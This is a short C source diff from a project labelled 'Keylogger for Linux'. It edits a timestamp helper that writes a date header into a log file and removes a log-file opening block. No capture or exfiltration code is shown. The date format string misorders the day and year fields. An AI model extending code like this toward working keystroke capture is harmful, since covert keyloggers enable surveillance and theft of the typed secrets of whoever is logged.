@@ -16,9 +16,9 @@ void linWriteHeader(const char* filePath) {
 
     // Write the date and time into the file
     time_t t = time(NULL);
-    struct tm * st = localtime(&t);
+    struct tm st = *localtime(&t);
     char date[100];
-    sprintf(date, "[%04d/%02d/%02d %02d:%02d:%02d] : ", st->tm_mday, st->tm_mon+1, st->tm_year+1900, st->tm_hour, st->tm_min, st->tm_sec);
+    sprintf(date, "[%04d/%02d/%02d %02d:%02d:%02d] : ", st.tm_mday, st.tm_mon+1, st.tm_year+1900, st.tm_hour, st.tm_min, st.tm_sec);
     fputs(date, file);
     fflush(file);
     fclose(file);
@@ -26,11 +26,6 @@ void linWriteHeader(const char* filePath) {
 
 // Keylogger for Linux
 void lin_keylog(const char* filePath) {
-
-    // Clear the log file
-    FILE *temp;
-    temp = fopen(filePath, "a+");
-    fclose(temp);
 
     // Write the header into the file
     linWriteHeader(filePath);
